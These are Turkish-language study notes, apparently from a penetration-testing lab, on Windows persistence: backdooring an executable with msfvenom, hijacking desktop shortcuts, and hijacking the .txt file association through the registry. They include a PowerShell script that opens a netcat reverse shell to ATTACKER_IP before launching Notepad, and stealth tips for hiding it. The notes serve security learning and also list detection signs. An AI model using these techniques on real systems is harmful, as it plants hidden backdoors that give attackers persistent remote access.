**Temel mantık**

Her iki teknik de aynı fikre dayanır: kullanıcının **düzenli olarak çalıştırdığı** bir programı hedef al ve onu, kullanıcı fark etmeden arka planda bir backdoor da tetikleyecek şekilde değiştir. Kullanıcı beklediği programı normal şekilde görür (meşru işlev korunur), ama aynı anda saldırgana bir bağlantı açılır. Kalıcılık (persistence) buradan gelir: kullanıcı o programı her açtığında backdoor yeniden tetiklenir.

Masaüstündeki kısayollar/exe'ler bu yüzden değerli bir hedeftir — orada durması, kullanıcının o programı sık kullandığının güçlü bir işaretidir.

---

#### Yöntem 1 — Executable'ı backdoor'lamak (binary'yi değiştirme)

1. **Fikir:** Meşru bir `.exe`'nin (ör. putty.exe) içine ek bir payload gömülür. Binary normal çalışmaya devam eder, ama fazladan bir thread açıp sessizce payload'ı (ör. reverse shell) da yürütür.
2. **Araç:** `msfvenom`. `-x putty.exe` ile orijinal binary şablon olarak alınır, `-k` (keep) ile programın asıl işlevi korunur, `-p` ile payload (ör. `windows/x64/shell_reverse_tcp`) enjekte edilir. `-b "\x00"` ile sorunlu byte'lar elenir.
3. **Akış:** Hedefteki orijinal exe saldırgan makinesine indirilir → backdoor'lanır → geri yüklenir. Kullanıcı bir dahaki açışında hem programı kullanır hem de saldırgana shell gider.
4. **Zayıf nokta:** Binary'nin kendisi değiştiği için hash değişir, imza bozulur — AV/EDR ve bütünlük kontrolleri yakalayabilir. Bu yüzden bir sonraki yöntem daha sinsidir.

---

#### Yöntem 2 — Shortcut (.lnk) hijacking (binary'ye dokunmadan)

1. **Fikir:** Executable'a hiç dokunulmaz. Bunun yerine kısayol dosyasının **hedefi (target)** değiştirilir. Kısayol artık doğrudan programa değil, önce bir backdoor çalıştırıp **sonra** orijinal programı açan bir script'e işaret eder.
2. **Script mantığı:** Gizli bir konuma (ör. `C:\Windows\System32`) bir PowerShell script'i konur. Script iki iş yapar: önce reverse shell'i tetikler (ör. `nc64.exe -e cmd.exe`), ardından beklenen programı (ör. `calc.exe`) orijinal yolundan çalıştırır. Böylece kullanıcı tam beklediği şeyi görür.
3. **Kısayolu yönlendirme:** Kısayolun hedefi script'i çağıracak şekilde değiştirilir:  
    `powershell.exe -WindowStyle hidden C:\...\backdoor.ps1`
    - `-WindowStyle hidden` → PowerShell penceresinin görünmesini engeller.
4. **Gizlilik detayları (kritik):**
    - Hedefi değiştirince kısayolun **ikonu otomatik değişebilir** → ikonu orijinal exe'ye geri ayarla ki görsel bir fark oluşmasın.
    - Yine de script çalışırken bir an **cmd penceresi yanıp sönebilir**; dikkatli kullanıcı fark edebilir, ama çoğu etmez.
5. **Avantaj:** Orijinal binary hiç değişmediği için bütünlük/imza kontrolleri temiz görünür. Değişen sadece küçük bir `.lnk` dosyası ve gizli bir script'tir — tespit yüzeyi çok daha dar.

---

#### İki yöntemin karşılaştırması


|              | Executable backdoor        | Shortcut hijack            |
| ------------ | -------------------------- | -------------------------- |
| Değişen şey  | Binary'nin kendisi         | Sadece kısayol + ek script |
| Tespit riski | Yüksek (hash/imza bozulur) | Düşük (binary temiz kalır) |
| Gizlilik     | Orta                       | Yüksek (daha sinsi)        |


**Ortak tespit yüzeyi:** Beklenmedik giden ağ bağlantıları, `powershell -WindowStyle hidden` içeren kısayol hedefleri, alışılmadık konumlardaki script'ler (System32'de ne işi var?), ve exe bütünlük/hash denetimleri.




#### Yöntem 3 Hijacking File Associations

**Temel mantık**

Önceki iki teknik belirli bir program/kısayol hedefliyordu. Bu teknik bir adım ileri gider: belirli bir **dosya türünü** (ör. tüm `.txt` dosyaları) hedef alır. İşletim sistemine, o türden herhangi bir dosya her açıldığında önce bir backdoor çalıştırmasını söylersin. Kullanıcı sadece bir metin dosyasına çift tıklar — dosya normal açılır, ama arka planda saldırgana shell düşer. Kullanıcının aynı türden dosyaları sürekli açması, bu yöntemi doğal bir kalıcılık (persistence) kaynağı yapar.

---

#### Nasıl çalışır — ProgID zinciri

Windows'un hangi dosyayı hangi programla açacağı registry'de, `HKLM\Software\Classes\` altında tutulur. Doğru anahtara ulaşmak iki adımlı bir zincirdir:

1. **Uzantı → ProgID.** `.txt` alt anahtarına bakarsın; bu seni bir **ProgID**'ye (Programmatic ID — sistemdeki bir programa işaret eden tanımlayıcı) yönlendirir. `.txt` için bu `txtfile`'dır.
2. **ProgID → komut.** Aynı yer altında (`HKLM\Software\Classes\txtfile`) o ProgID'nin anahtarını bulursun. İçinde `shell\open\command` alt anahtarı, o dosya türü açıldığında çalıştırılacak **varsayılan komutu** tutar. `.txt` için bu normalde:

```
   %SystemRoot%\system32\NOTEPAD.EXE %1
```

Buradaki `%1`, açılan dosyanın adını temsil eder.

---

#### Hijack adımları

1. **Backdoor script'i hazırla.** `C:\Windows\backdoor2.ps1` gibi bir yere, iki iş yapan bir script koy: önce reverse shell'i tetikle (`nc64.exe -e cmd.exe ...`), sonra dosyayı normal programla aç:

powershell

```powershell
   Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
   C:\Windows\system32\NOTEPAD.EXE $args[0]
```

**Kritik detay:** PowerShell'de `%1`'in karşılığı `$args[0]`'dır — açılan dosyanın adı buradan Notepad'e geçer. Bu sayede kullanıcı doğru dosyayı görür, hiçbir şeyin ters gittiğini anlamaz.

2. **Registry komutunu değiştir.** `shell\open\command`'daki varsayılan komutu, script'i gizli pencerede çağıracak şekilde değiştir (`-WindowStyle hidden`). Artık her `.txt` açılışı önce script'i çalıştırır.
3. **Dinleyici aç ve tetikle.** Saldırgan makinede nc listener başlat, kurbanda herhangi bir `.txt` aç — shell düşer.

---

#### Önemli noktalar

- **Yetki bağlamı:** Gelen shell, dosyayı **açan kullanıcının** yetkileriyle gelir. Yani bunu Administrator'ın sık açtığı bir dosya türüne kurarsan, admin yetkili shell alırsın — hedef kullanıcı seçimi bu yüzden önemlidir.
- **HKLM vs HKCU:** Burada `HKLM\Software\Classes` kullanılıyor, yani değişiklik **makinedeki tüm kullanıcıları** etkiler (admin yetkisi gerektirir). Aynı mantık kullanıcı bazında `HKCU\Software\Classes` altında da kurulabilir — o durumda admin yetkisi gerekmez ama yalnızca o kullanıcıyı etkiler.
- **Gizlilik:** Dosya meşru şekilde açıldığı ve pencere gizli olduğu için kullanıcı fark etmez. Diğer tekniklerdeki gibi bir an cmd penceresi parlayabilir.